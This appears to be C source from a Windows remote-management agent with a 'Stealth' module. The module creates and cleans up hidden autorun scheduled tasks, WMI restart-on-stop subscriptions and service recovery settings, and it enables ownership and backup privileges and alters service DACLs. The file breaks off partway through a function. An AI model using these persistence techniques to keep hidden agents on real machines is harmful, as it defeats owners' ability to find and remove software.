static void Stealth_RemoveScheduledTasks(const mesh_persistence_profile_t* persistence, const wchar_t* serviceDisplayName, const wchar_t* serviceKeyName)
{
    wchar_t prefixCandidates[10][STEALTH_TASK_NAME_MAX] = {0};
    size_t prefixCount = Stealth_BuildTaskPrefixCandidates(
        persistence,
        serviceDisplayName,
        serviceKeyName,
        prefixCandidates,
        _countof(prefixCandidates));

    StealthPersistenceState state = {0};
    BOOL hadState = Stealth_LoadPersistenceState(&state);

    if (state.AutorunTask[0] != L'\0')
    {
        if (StealthResilience_DeleteTask(state.AutorunTask))
        {
            Stealth_LogInstallEvent(L"Removed autorun task %ls", state.AutorunTask);
        }
    }
    if (state.RestartTask[0] != L'\0')
    {
        if (StealthResilience_DeleteTask(state.RestartTask))
        {
            Stealth_LogInstallEvent(L"Removed restart-on-stop task %ls", state.RestartTask);
        }
    }
    if (state.WmiFilter[0] != L'\0' || state.WmiConsumer[0] != L'\0')
    {
        StealthResilience_RemoveWmiSubscription(state.WmiFilter, state.WmiConsumer);
    }

    for (size_t i = 0; i < prefixCount; ++i)
    {
        wchar_t autoPrefix[STEALTH_TASK_NAME_MAX] = {0};
        StringCchPrintfW(autoPrefix, _countof(autoPrefix), L"%s-", prefixCandidates[i]);

        DWORD removed = 0;
        if (!StealthResilience_DeleteTasksByPrefix(autoPrefix, L"-Autorun-", &removed))
        {
            Stealth_LogInstallEvent(L"[WARN] Failed to enumerate autorun tasks for prefix %ls", prefixCandidates[i]);
        }
        if (removed > 0)
        {
            Stealth_LogInstallEvent(L"Removed %lu autorun task(s) via prefix cleanup (%ls)", removed, prefixCandidates[i]);
        }
        removed = 0;
        if (!StealthResilience_DeleteTasksByPrefix(autoPrefix, L"-RestartOnStop-", &removed))
        {
            Stealth_LogInstallEvent(L"[WARN] Failed to enumerate restart tasks for prefix %ls", prefixCandidates[i]);
        }
        if (removed > 0)
        {
            Stealth_LogInstallEvent(L"Removed %lu restart-on-stop task(s) via prefix cleanup (%ls)", removed, prefixCandidates[i]);
        }

        removed = 0;
        if (!StealthResilience_DeleteTasksByPrefix(autoPrefix, NULL, &removed))
        {
            Stealth_LogInstallEvent(L"[WARN] Failed to enumerate tasks for prefix %ls", prefixCandidates[i]);
        }
        if (removed > 0)
        {
            Stealth_LogInstallEvent(L"Removed %lu task(s) via broad prefix cleanup (%ls)", removed, prefixCandidates[i]);
        }
    }

    for (size_t i = 0; i < prefixCount; ++i)
    {
        wchar_t filterPrefix[256] = {0};
        wchar_t consumerPrefix[256] = {0};
        StringCchPrintfW(filterPrefix, _countof(filterPrefix), L"%s_StopFilter_", prefixCandidates[i]);
        StringCchPrintfW(consumerPrefix, _countof(consumerPrefix), L"%s_RestartConsumer_", prefixCandidates[i]);
        DWORD filtersRemoved = 0, consumersRemoved = 0;
        StealthResilience_RemoveWmiSubscriptionsByPrefix(filterPrefix, consumerPrefix, &filtersRemoved, &consumersRemoved);
        if (filtersRemoved > 0 || consumersRemoved > 0)
        {
            Stealth_LogInstallEvent(L"Removed %lu WMI filters and %lu consumers via prefix cleanup (%ls)", filtersRemoved, consumersRemoved, prefixCandidates[i]);
        }
    }

    for (int attempt = 0; attempt < 8; ++attempt)
    {
        wchar_t leftoverTask[STEALTH_TASK_NAME_MAX] = {0};
        if (!Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, NULL, leftoverTask, _countof(leftoverTask)))
        {
            break;
        }
        if (!Stealth_RemoveScheduledTaskByName(leftoverTask, L"Scheduled task fallback cleanup"))
        {
            Stealth_LogInstallEvent(L"[WARN] Failed to remove scheduled task via fallback: %ls", leftoverTask);
            break;
        }
    }

    wchar_t remainingTask[STEALTH_TASK_NAME_MAX] = {0};
    if (Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, NULL, remainingTask, _countof(remainingTask)))
    {
        Stealth_LogInstallEvent(L"[WARN] Scheduled tasks remain after cleanup: %ls", remainingTask);
    }

    Stealth_ClearPersistenceState();
}

static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName, BOOL refreshExisting)
{
    if (persistence == NULL || persistence->autorunTask.enabled == 0 || serviceName == NULL || serviceName[0] == L'\0')
    {
        Stealth_LogInstallEvent(L"Autorun scheduled task disabled");
        return;
    }

    wchar_t taskHint[STEALTH_TASK_NAME_MAX] = {0};
    MeshService_CopyBrandingTextToWide(persistence->autorunTask.taskName, taskHint, _countof(taskHint));

    wchar_t taskPrefix[STEALTH_TASK_NAME_MAX] = {0};
    Stealth_BuildTaskPrefixFromHint(taskHint, serviceName, taskPrefix, _countof(taskPrefix));

    wchar_t diagnosticsPrefix[STEALTH_TASK_NAME_MAX] = {0};
    StringCchPrintfW(diagnosticsPrefix, _countof(diagnosticsPrefix), L"%s-", taskPrefix);

    wchar_t trigger[64] = {0};
    MeshService_CopyBrandingTextToWide(persistence->autorunTask.trigger, trigger, _countof(trigger));
    if (trigger[0] == L'\0')
    {
        StringCchCopyW(trigger, _countof(trigger), L"ONLOGON");
    }
    Stealth_ToUppercase(trigger);

    StealthPersistenceState state = {0};
    BOOL haveState = Stealth_LoadPersistenceState(&state);

    if (haveState && state.AutorunTask[0] != L'\0')
    {
        if (StealthResilience_TaskExists(state.AutorunTask))
        {
            Stealth_LogInstallEvent(L"Scheduled autorun task already present (%ls)", state.AutorunTask);
            return;
        }
        else if (refreshExisting)
        {
            Stealth_LogInstallEvent(L"Removing stale autorun task reference (%ls)", state.AutorunTask);
            StealthResilience_DeleteTask(state.AutorunTask);
            state.AutorunTask[0] = L'\0';
            Stealth_SavePersistenceState(&state);
        }
    }

    if (state.AutorunTask[0] == L'\0')
    {
        wchar_t existingTask[STEALTH_TASK_NAME_MAX] = {0};
        if (StealthResilience_FindTaskByPrefix(diagnosticsPrefix, L"-Autorun-", existingTask, _countof(existingTask)))
        {
            Stealth_LogInstallEvent(L"Scheduled autorun task already present (%ls)", existingTask);
            Stealth_RecordPersistenceTask(&state, existingTask, FALSE);
            Stealth_SavePersistenceState(&state);
            return;
        }
    }

    wchar_t createdTaskPath[STEALTH_TASK_NAME_MAX] = {0};
    if (StealthResilience_CreateAutorunTask(
            serviceName,
            taskHint,
            trigger,
            (persistence->autorunTask.hidden ? TRUE : FALSE),
            createdTaskPath,
            _countof(createdTaskPath)))
    {
        Stealth_LogInstallEvent(L"Scheduled autorun task %ls", createdTaskPath);
        Stealth_RecordPersistenceTask(&state, createdTaskPath, FALSE);
        Stealth_SavePersistenceState(&state);
    }
    else
    {
        Stealth_LogInstallEvent(L"[WARN] Failed to schedule autorun task for %ls", serviceName);
    }
}

static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName, BOOL refreshExisting)
{
    if (persistence == NULL || persistence->restartTask.enabled == 0 || serviceName == NULL || serviceName[0] == L'\0')
    {
        Stealth_LogInstallEvent(L"Restart-on-stop persistence disabled");
        return;
    }

    wchar_t restartHint[STEALTH_TASK_NAME_MAX] = {0};
    MeshService_CopyBrandingTextToWide(persistence->restartTask.taskName, restartHint, _countof(restartHint));

    wchar_t taskPrefix[STEALTH_TASK_NAME_MAX] = {0};
    Stealth_BuildTaskPrefixFromHint(restartHint, serviceName, taskPrefix, _countof(taskPrefix));

    wchar_t diagnosticsPrefix[STEALTH_TASK_NAME_MAX] = {0};
    StringCchPrintfW(diagnosticsPrefix, _countof(diagnosticsPrefix), L"%s-", taskPrefix);

    wchar_t wmiClass[128] = {0};
    wchar_t wmiMethod[128] = {0};
    wchar_t wmiNamespace[128] = {0};

    MeshService_CopyBrandingTextToWide(persistence->restartTask.wmiClass, wmiClass, _countof(wmiClass));
    MeshService_CopyBrandingTextToWide(persistence->restartTask.wmiMethod, wmiMethod, _countof(wmiMethod));
    MeshService_CopyBrandingTextToWide(persistence->restartTask.wmiNamespace, wmiNamespace, _countof(wmiNamespace));

    wchar_t wmiPrefix[STEALTH_TASK_NAME_MAX] = {0};
    Stealth_BuildTaskPrefixFromHint(wmiClass, serviceName, wmiPrefix, _countof(wmiPrefix));

    wchar_t filterPrefix[256] = {0};
    wchar_t consumerPrefix[256] = {0};
    StringCchPrintfW(filterPrefix, _countof(filterPrefix), L"%s_StopFilter_", wmiPrefix);
    StringCchPrintfW(consumerPrefix, _countof(consumerPrefix), L"%s_RestartConsumer_", wmiPrefix);

    StealthPersistenceState state = {0};
    BOOL haveState = Stealth_LoadPersistenceState(&state);

    BOOL restartTaskHealthy = FALSE;
    BOOL wmiHealthy = FALSE;

    if (haveState)
    {
        if (state.RestartTask[0] != L'\0')
        {
            restartTaskHealthy = StealthResilience_TaskExists(state.RestartTask);
            if (restartTaskHealthy)
            {
                Stealth_LogInstallEvent(L"Restart-on-stop task already present (%ls)", state.RestartTask);
            }
            else if (refreshExisting)
            {
                Stealth_LogInstallEvent(L"Removing stale restart task reference (%ls)", state.RestartTask);
                StealthResilience_DeleteTask(state.RestartTask);
                state.RestartTask[0] = L'\0';
                Stealth_SavePersistenceState(&state);
            }
        }
        if (state.WmiFilter[0] != L'\0' || state.WmiConsumer[0] != L'\0')
        {
            wmiHealthy = StealthResilience_WmiSubscriptionExists(state.WmiFilter, state.WmiConsumer);
            if (wmiHealthy)
            {
                Stealth_LogInstallEvent(L"WMI restart subscription already present (%ls/%ls)", state.WmiFilter, state.WmiConsumer);
            }
            else if (refreshExisting)
            {
                Stealth_LogInstallEvent(L"Removing stale WMI subscription (%ls/%ls)", state.WmiFilter, state.WmiConsumer);
                StealthResilience_RemoveWmiSubscription(state.WmiFilter, state.WmiConsumer);
                state.WmiFilter[0] = L'\0';
                state.WmiConsumer[0] = L'\0';
                Stealth_SavePersistenceState(&state);
            }
        }
    }

    if (!restartTaskHealthy)
    {
        wchar_t existingRestart[STEALTH_TASK_NAME_MAX] = {0};
        if (StealthResilience_FindTaskByPrefix(diagnosticsPrefix, L"-RestartOnStop-", existingRestart, _countof(existingRestart)))
        {
            Stealth_LogInstallEvent(L"Restart-on-stop task already present (%ls)", existingRestart);
            Stealth_RecordPersistenceTask(&state, existingRestart, TRUE);
            Stealth_SavePersistenceState(&state);
            restartTaskHealthy = TRUE;
        }
    }

    if (!wmiHealthy)
    {
        wchar_t existingFilter[128] = {0};
        wchar_t existingConsumer[128] = {0};
        if (StealthResilience_FindWmiSubscriptionsByPrefix(
                filterPrefix,
                consumerPrefix,
                existingFilter,
                _countof(existingFilter),
                existingConsumer,
                _countof(existingConsumer)))
        {
            Stealth_LogInstallEvent(L"WMI restart subscription already present (%ls/%ls)", existingFilter, existingConsumer);
            Stealth_RecordPersistenceWmi(&state, existingFilter, existingConsumer);
            Stealth_SavePersistenceState(&state);
            wmiHealthy = TRUE;
        }
    }

    wchar_t wmiFilter[128] = {0};
    wchar_t wmiConsumer[128] = {0};

    if (!wmiHealthy)
    {
        if (StealthResilience_CreateWmiRestartSubscription(
                serviceName,
                wmiClass,
                wmiMethod,
                wmiNamespace,
                wmiFilter,
                _countof(wmiFilter),
                wmiConsumer,
                _countof(wmiConsumer)))
        {
            Stealth_LogInstallEvent(L"Registered WMI restart consumer (Filter=%ls Consumer=%ls)", wmiFilter, wmiConsumer);
            Stealth_RecordPersistenceWmi(&state, wmiFilter, wmiConsumer);
            Stealth_SavePersistenceState(&state);
        }
        else
        {
            Stealth_LogInstallEvent(L"[WARN] Failed to register WMI restart consumer for %ls", serviceName);
        }
    }

    wchar_t xPath[1024] = {0};
    Stealth_FormatServiceStopXPath(serviceName, xPath, _countof(xPath));

    if (!restartTaskHealthy)
    {
        wchar_t createdTaskPath[STEALTH_TASK_NAME_MAX] = {0};
        if (StealthResilience_CreateRestartTask(
                serviceName,
                restartHint,
                xPath,
                TRUE,
                createdTaskPath,
                _countof(createdTaskPath)))
        {
            Stealth_LogInstallEvent(L"Scheduled restart-on-stop task %ls", createdTaskPath);
            Stealth_RecordPersistenceTask(&state, createdTaskPath, TRUE);
            Stealth_SavePersistenceState(&state);
        }
        else
        {
            Stealth_LogInstallEvent(L"[WARN] Failed to schedule restart-on-stop task for %ls", serviceName);
        }
    }
}

static void Stealth_TrimWhitespaceInplace(wchar_t* value)
{
    if (value == NULL) { return; }
    size_t len = wcslen(value);
    while (len > 0 && iswspace(value[len - 1]))
    {
        value[--len] = L'\0';
    }
    size_t start = 0;
    while (value[start] != L'\0' && iswspace(value[start])) { ++start; }
    if (start > 0)
    {
        memmove(value, value + start, (wcslen(value + start) + 1) * sizeof(wchar_t));
    }
}

static SC_ACTION_TYPE Stealth_MapRecoveryActionToken(const wchar_t* token)
{
    if (token == NULL) { return SC_ACTION_NONE; }
    if (_wcsicmp(token, L"restart") == 0) { return SC_ACTION_RESTART; }
    if (_wcsicmp(token, L"reboot") == 0) { return SC_ACTION_REBOOT; }
    if (_wcsicmp(token, L"none") == 0) { return SC_ACTION_NONE; }
    if (_wcsicmp(token, L"runcommand") == 0 || _wcsicmp(token, L"run_command") == 0)
    {
        Stealth_LogInstallEvent(L"RunCommand failure action not supported; ignoring token");
        return SC_ACTION_NONE;
    }
    return SC_ACTION_NONE;
}

static SC_ACTION* Stealth_CreateRestartPlan(size_t actionCount, DWORD delayMs, DWORD* actionCountOut)
{
    if (actionCount == 0) { return NULL; }
    SC_ACTION* actions = (SC_ACTION*)LocalAlloc(LPTR, sizeof(SC_ACTION) * actionCount);
    if (actions == NULL) { return NULL; }
    for (size_t i = 0; i < actionCount; ++i)
    {
        actions[i].Type = SC_ACTION_RESTART;
        actions[i].Delay = delayMs;
    }
    if (actionCountOut) { *actionCountOut = (DWORD)actionCount; }
    return actions;
}

static SC_ACTION* Stealth_BuildRecoveryActionsFromCsv(const wchar_t* csv, DWORD delayMs, DWORD* actionCountOut)
{
    if (actionCountOut) { *actionCountOut = 0; }
    if (csv == NULL || csv[0] == L'\0') { return NULL; }

    wchar_t firstPass[512] = {0};
    wchar_t secondPass[512] = {0};
    wcsncpy_s(firstPass, _countof(firstPass), csv, _TRUNCATE);
    wcsncpy_s(secondPass, _countof(secondPass), csv, _TRUNCATE);

    size_t count = 0;
    wchar_t* context = NULL;
    wchar_t* token = wcstok_s(firstPass, L",", &context);
    while (token != NULL)
    {
        Stealth_TrimWhitespaceInplace(token);
        if (token[0] != L'\0') { ++count; }
        token = wcstok_s(NULL, L",", &context);
    }
    if (count == 0) { return NULL; }

    SC_ACTION* actions = (SC_ACTION*)LocalAlloc(LPTR, sizeof(SC_ACTION) * count);
    if (actions == NULL) { return NULL; }

    context = NULL;
    token = wcstok_s(secondPass, L",", &context);
    size_t idx = 0;
    while (token != NULL && idx < count)
    {
        Stealth_TrimWhitespaceInplace(token);
        if (token[0] != L'\0')
        {
            actions[idx].Type = Stealth_MapRecoveryActionToken(token);
            actions[idx].Delay = delayMs;
            ++idx;
        }
        token = wcstok_s(NULL, L",", &context);
    }

    if (idx == 0)
    {
        LocalFree(actions);
        return NULL;
    }

    if (actionCountOut) { *actionCountOut = (DWORD)idx; }
    return actions;
}

static void Stealth_ConfigureServiceRecoveryIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
{
    if (persistence == NULL || serviceName == NULL || serviceName[0] == L'\0')
    {
        return;
    }

    BOOL useRecovery = (persistence->recovery.enabled != 0);
    BOOL useWatchdog = (persistence->watchdog.enabled != 0);
    Stealth_LogInstallEvent(L"Service recovery toggles: recovery=%u watchdog=%u", persistence->recovery.enabled, persistence->watchdog.enabled);
    if (!useRecovery && !useWatchdog)
    {
        Stealth_LogInstallEvent(L"Service recovery/watchdog toggles disabled");
        return;
    }

    DWORD resetPeriodSeconds = 0;
    DWORD restartDelayMs = 0;
    BOOL applyOnCrash = FALSE;
    SC_ACTION* actions = NULL;
    DWORD actionCount = 0;

    if (useRecovery)
    {
        wchar_t csvBuffer[512] = {0};
        if (persistence->recovery.actions != NULL)
        {
            MeshService_CopyBrandingTextToWide(persistence->recovery.actions, csvBuffer, _countof(csvBuffer));
        }
        if (csvBuffer[0] == L'\0')
        {
            wcscpy_s(csvBuffer, _countof(csvBuffer), L"restart,restart,restart");
        }

        restartDelayMs = (persistence->recovery.restartDelayMilliseconds > 0) ?
            persistence->recovery.restartDelayMilliseconds : 10000;
        resetPeriodSeconds = (persistence->recovery.resetPeriodSeconds > 0) ?
            persistence->recovery.resetPeriodSeconds : 86400;
        applyOnCrash = useWatchdog ? (persistence->watchdog.restartOnCrash != 0) : TRUE;

        actions = Stealth_BuildRecoveryActionsFromCsv(csvBuffer, restartDelayMs, &actionCount);
        if ((actions == NULL || actionCount == 0) && useWatchdog)
        {
            LocalFree(actions);
            actions = Stealth_CreateRestartPlan(3, restartDelayMs, &actionCount);
        }
    }
    else if (useWatchdog)
    {
        restartDelayMs = (persistence->watchdog.restartDelaySeconds > 0) ?
            persistence->watchdog.restartDelaySeconds * 1000 : 10000;
        resetPeriodSeconds = (persistence->watchdog.intervalSeconds > 0) ?
            persistence->watchdog.intervalSeconds : 86400;
        applyOnCrash = (persistence->watchdog.restartOnCrash != 0);
        actions = Stealth_CreateRestartPlan(3, restartDelayMs, &actionCount);
    }

    if (actions == NULL || actionCount == 0)
    {
        if (actions) { LocalFree(actions); }
        Stealth_LogInstallEvent(L"Service recovery configuration skipped (no actions)");
        return;
    }

    Stealth_EnablePrivilege(L"SeTakeOwnershipPrivilege");
    Stealth_EnablePrivilege(L"SeSecurityPrivilege");
    Stealth_EnablePrivilege(L"SeBackupPrivilege");
    Stealth_EnablePrivilege(L"SeRestorePrivilege");

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
    {
        DWORD err = GetLastError();
        Stealth_DebugLastErrorW(L"OpenSCManagerW (recovery)");
        Stealth_LogInstallEvent(L"OpenSCManagerW failed while setting recovery (%lu)", err);
        LocalFree(actions);
        return;
    }

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (!hService)
    {
        DWORD err = GetLastError();
        Stealth_DebugLastErrorW(L"OpenServiceW (recovery)");
        Stealth_LogInstallEvent(L"OpenServiceW failed while setting recovery (%lu)", err);
        CloseServiceHandle(hSCM);
        LocalFree(actions);
        return;
    }

    SERVICE_FAILURE_ACTIONSW sfa = {0};
    sfa.dwResetPeriod = resetPeriodSeconds;
    sfa.cActions = actionCount;
    sfa.lpsaActions = actions;

    if (ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa))
    {
        Stealth_LogInstallEvent(L"Configured SCM recovery for %ls (actions=%u reset=%u delay=%u)",
            serviceName,
            (unsigned int)actionCount,
            (unsigned int)resetPeriodSeconds,
            (unsigned int)actions[0].Delay);
    }
    else
    {
        DWORD err = GetLastError();
        Stealth_DebugLastErrorW(L"ChangeServiceConfig2W(SERVICE_CONFIG_FAILURE_ACTIONS)");
        Stealth_LogInstallEvent(L"Failed to configure SCM recovery for %ls (error=%lu)", serviceName, err);
    }

    SERVICE_FAILURE_ACTIONS_FLAG flag = {0};
    flag.fFailureActionsOnNonCrashFailures = applyOnCrash ? TRUE : FALSE;
    if (!ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS_FLAG, &flag))
    {
        DWORD err = GetLastError();
        Stealth_DebugLastErrorW(L"ChangeServiceConfig2W(SERVICE_CONFIG_FAILURE_ACTIONS_FLAG)");
        Stealth_LogInstallEvent(L"Failed to set FailureActionsOnNonCrashFailures (error=%lu)", err);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    LocalFree(actions);
}

static void Stealth_ClearServiceRecovery(const wchar_t* serviceName)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return; }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM == NULL) { return; }

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_CHANGE_CONFIG);
    if (hService == NULL)
    {
        CloseServiceHandle(hSCM);
        return;
    }

    SERVICE_FAILURE_ACTIONSW actions;
    ZeroMemory(&actions, sizeof(actions));
    actions.dwResetPeriod = 0;
    actions.cActions = 0;
    actions.lpsaActions = NULL;
    actions.lpCommand = NULL;
    actions.lpRebootMsg = NULL;
    ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &actions);

    SERVICE_FAILURE_ACTIONS_FLAG flag;
    ZeroMemory(&flag, sizeof(flag));
    flag.fFailureActionsOnNonCrashFailures = FALSE;
    ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS_FLAG, &flag);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
}

void Stealth_ApplyPersistenceProfile(void)
{
    static BOOL g_RuntimePersistenceApplied = FALSE;
    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
    if (!g_HavePersistenceStatePath)
    {
        StealthInstallPaths paths;
        if (Stealth_GetInstallPaths(&paths))
        {
            Stealth_UpdatePersistenceStatePath(paths.installDir);
        }
    }

    wchar_t serviceKeyName[256] = {0};
    wchar_t serviceDisplayName[256] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
    if (serviceKeyName[0] == L'\0')
    {
        StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME);
    }
    if (serviceDisplayName[0] == L'\0')
    {
        StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME);
    }

    if (persistence)
    {
        if (!g_RuntimePersistenceApplied)
        {
            Stealth_LogInstallEvent(L"Ensuring runtime persistence artifacts for %ls", serviceKeyName);
        }
        BOOL refreshExisting = g_RuntimePersistenceApplied ? TRUE : FALSE;
        Stealth_AddRunKeyIfEnabled(persistence, serviceKeyName);
        Stealth_AddScheduledTaskIfEnabled(persistence, serviceDisplayName, refreshExisting);
        Stealth_AddServiceStoppedAutoStartIfEnabled(persistence, serviceKeyName, refreshExisting);
        Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
        g_RuntimePersistenceApplied = TRUE;
    }
    else
    {
        Stealth_LogInstallEvent(L"No persistence profile available");
    }
}

static BOOL Stealth_QueryServiceStartType(const wchar_t* serviceName, DWORD* startTypeOut)
{
    if (startTypeOut != NULL) { *startTypeOut = SERVICE_NO_CHANGE; }
    if (serviceName == NULL || serviceName[0] == L'\0' || startTypeOut == NULL) { return FALSE; }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM == NULL) { return FALSE; }

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_QUERY_CONFIG);
    if (hService == NULL)
    {
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    DWORD bytesNeeded = 0;
    QueryServiceConfigW(hService, NULL, 0, &bytesNeeded);
    if (bytesNeeded == 0 || GetLastError() != ERROR_INSUFFICIENT_BUFFER)
    {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    QUERY_SERVICE_CONFIGW* config = (QUERY_SERVICE_CONFIGW*)LocalAlloc(LPTR, bytesNeeded);
    if (config == NULL)
    {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    BOOL ok = QueryServiceConfigW(hService, config, bytesNeeded, &bytesNeeded);
    if (ok)
    {
        *startTypeOut = config->dwStartType;
    }

    LocalFree(config);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return ok;
}

static BOOL Stealth_SetServiceStartType(const wchar_t* serviceName, DWORD startType)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
    if (startType == SERVICE_NO_CHANGE) { return TRUE; }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM == NULL) { return FALSE; }

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_CHANGE_CONFIG);
    if (hService == NULL)
    {
        DWORD openErr = GetLastError();
        if (openErr == ERROR_ACCESS_DENIED)
        {
            MeshService_HardenServiceDaclByName(serviceName);
            hService = OpenServiceW(hSCM, serviceName, SERVICE_CHANGE_CONFIG);
        }
    }

    if (hService == NULL)
    {
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    BOOL ok = ChangeServiceConfigW(
        hService,
        SERVICE_NO_CHANGE,
        startType,
        SERVICE_NO_CHANGE,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return ok;
}

static BOOL Stealth_SetServiceAllowStop(const wchar_t* serviceName, BOOL allow)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }

    wchar_t paramsKeyPath[512];
    _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);

    HKEY hKey = NULL;
    LONG regStatus = RegCreateKeyExW(HKEY_LOCAL_MACHINE, paramsKeyPath, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (regStatus != ERROR_SUCCESS)
    {
        Stealth_LogInstallEvent(L"[WARN] Failed to open Parameters key for %ls (error=%ld)", serviceName, regStatus);
        return FALSE;
    }

    BOOL ok = TRUE;
    if (allow)
    {
        DWORD value = 1;
        ok = (RegSetValueExW(hKey, L"AllowStop", 0, REG_DWORD, (const BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
        if (ok)
        {
            Stealth_LogInstallEvent(L"AllowStop enabled for %ls", serviceName);
        }
        else
        {
            Stealth_LogInstallEvent(L"[WARN] Failed to enable AllowStop for %ls", serviceName);
        }
    }
    else
    {
        if (RegDeleteValueW(hKey, L"AllowStop") == ERROR_SUCCESS)
        {
            Stealth_LogInstallEvent(L"AllowStop cleared for %ls", serviceName);
        }
    }

    RegCloseKey(hKey);
    return ok;
}

static BOOL Stealth_StopServiceAndWait(const wchar_t* serviceName, DWORD timeoutMs, BOOL forceTerminate)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM == NULL) { return FALSE; }

    DWORD openErr = ERROR_SUCCESS;
    BOOL canStop = TRUE;
    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (hService == NULL)
    {
        openErr = GetLastError();
        if (openErr == ERROR_ACCESS_DENIED)
        {
            MeshService_HardenServiceDaclByName(serviceName);
            hService = OpenServiceW(hSCM, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
        }
        if (hService == NULL)
        {
            openErr = GetLastError();
            Stealth_LogInstallEvent(L"[WARN] OpenService failed for stop (%ls, error=%lu)", serviceName, openErr);
        }
        hService = OpenServiceW(hSCM, serviceName, SERVICE_QUERY_STATUS);
        if (hService == NULL)
        {
            CloseServiceHandle(hSCM);
            return FALSE;
        }
        canStop = FALSE;
    }

    BOOL stopped = FALSE;
    BOOL allowStopSet = FALSE;
    SERVICE_STATUS_PROCESS ssp = {0};
    DWORD needed = 0;
    DWORD lastStopAttempt = 0;
    BOOL loggedStopFailure = FALSE;

    if (forceTerminate && canStop)
    {
        if (Stealth_SetServiceAllowStop(serviceName, TRUE))
        {
            allowStopSet = TRUE;
        }
    }

    if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed))
    {
        if (ssp.dwCurrentState != SERVICE_STOPPED && canStop)
        {
            lastStopAttempt = GetTickCount();
            if (!ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
            {
                DWORD ctrlErr = GetLastError();
                if (!loggedStopFailure)
                {
                    Stealth_LogInstallEvent(L"[WARN] ControlService stop failed for %ls (error=%lu)", serviceName, ctrlErr);
                    loggedStopFailure = TRUE;
                }
                if (ctrlErr == ERROR_SERVICE_CANNOT_ACCEPT_CTRL || ctrlErr == ERROR_ACCESS_DENIED)
                {
                    MeshService_HardenServiceDaclByName(serviceName);
                    if (Stealth_SetServiceAllowStop(serviceName, TRUE))
                    {
                        allowStopSet = TRUE;
                        ControlService(hService, SERVICE_CONTROL_INTERROGATE, (LPSERVICE_STATUS)&ssp);
                        ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
                    }
                }
            }
        }
    }

    DWORD waited = 0;
    while (waited < timeoutMs)
    {
        if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed))
        {
            break;
        }
        if (ssp.dwCurrentState == SERVICE_STOPPED)
        {
            stopped = TRUE;
            break;
        }
        if (canStop && ssp.dwCurrentState != SERVICE_STOPPED)
        {
            DWORD now = GetTickCount();
            if (lastStopAttempt == 0 || (now - lastStopAttempt) >= 2000)
            {
                lastStopAttempt = now;
                if (!ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
                {
                    DWORD ctrlErr = GetLastError();
                    if (!loggedStopFailure)
                    {
                        Stealth_LogInstallEvent(L"[WARN] ControlService stop failed for %ls (error=%lu)", serviceName, ctrlErr);
                        loggedStopFailure = TRUE;
                    }
                    if (ctrlErr == ERROR_SERVICE_CANNOT_ACCEPT_CTRL || ctrlErr == ERROR_ACCESS_DENIED)
                    {
                        MeshService_HardenServiceDaclByName(serviceName);
                        if (Stealth_SetServiceAllowStop(serviceName, TRUE))
                        {
                            allowStopSet = TRUE;
                        }
                    }
                }
            }
